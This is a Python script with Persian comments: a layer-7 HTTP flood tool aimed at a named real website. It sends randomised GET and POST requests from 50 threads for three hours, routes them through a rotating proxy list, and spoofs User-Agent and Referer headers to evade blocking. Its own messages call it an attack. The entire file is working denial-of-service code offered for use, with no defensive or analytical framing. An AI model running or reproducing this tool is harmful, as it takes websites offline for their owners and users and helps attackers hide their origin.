import requests
import random
import time
import threading
from queue import Queue
from datetime import datetime, timedelta

# تنظیمات اولیه
target_url = "https://kimialastic.com/"  # آدرس سایت هدف (اینو با آدرس خودت جایگزین کن)
attack_duration_hours = 3  # مدت زمان اتک (به ساعت)
attack_duration = attack_duration_hours * 60 * 60  # تبدیل به ثانیه
request_interval = 0.01  # فاصله بین درخواست‌ها (ثانیه) - برای فشار بالا
max_threads = 50  # تعداد نخ‌ها برای موازی‌سازی

# لیست User-Agent برای شبیه‌سازی درخواست‌های طبیعی
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

# لیست Referer برای جعل هدرها
referers = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.facebook.com",
    "https://www.twitter.com"
]

# خواندن پروکسی‌های سالم از فایل
with open("working_proxies.txt", "r") as f:
    working_proxies = [line.strip() for line in f if line.strip()]

if not working_proxies:
    print("هیچ پروکسی سالمی پیدا نشد! لطفاً فایل working_proxies.txt رو چک کن.")
    exit()

# متغیر برای شمارش درخواست‌ها
total_requests = 0
successful_requests = 0
lock = threading.Lock()

# تابع ارسال درخواست با پروکسی و متدهای متنوع
def send_request(proxy):
    global total_requests, successful_requests
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    method = random.choice(["GET", "POST"])  # انتخاب تصادفی متد
    try:
        if method == "GET":
            response = requests.get(target_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=2)
        else:
            # برای POST، یه داده تصادفی می‌فرستیم
            data = {"key": str(random.randint(1, 1000))}
            response = requests.post(target_url, proxies={"http": proxy, "https": proxy}, headers=headers, data=data, timeout=2)

        with lock:
            total_requests += 1
            if response.status_code == 200:
                successful_requests += 1
                print(f"درخواست {method} با {proxy} موفق بود. کد پاسخ: {response.status_code}")
            else:
                print(f"درخواست {method} با {proxy} ناموفق بود. کد پاسخ: {response.status_code}")
        return True
    except:
        with lock:
            total_requests += 1
        print(f"درخواست {method} با {proxy} شکست خورد!")
        return False

# تابع کارگر برای هر نخ
def worker(queue, end_time):
    while datetime.now() < end_time:
        proxy = random.choice(working_proxies)  # انتخاب تصادفی پروکسی
        send_request(proxy)
        time.sleep(request_interval)

# زمان شروع و پایان
start_time = datetime.now()
end_time = start_time + timedelta(seconds=attack_duration)

# تنظیم نخ‌ها
threads = []
print(f"شروع حمله در {start_time} - پایان در {end_time}")

# شروع نخ‌ها
for _ in range(max_threads):
    thread = threading.Thread(target=worker, args=(Queue(), end_time))
    threads.append(thread)
    thread.start()

# منتظر پایان زمان
for thread in threads:
    thread.join()

# نمایش آمار نهایی
print("\nحمله تموم شد!")
print(f"تعداد کل درخواست‌ها: {total_requests}")
print(f"تعداد درخواست‌های موفق: {successful_requests}")
print(f"درصد موفقیت: {(successful_requests / total_requests) * 100:.2f}%")
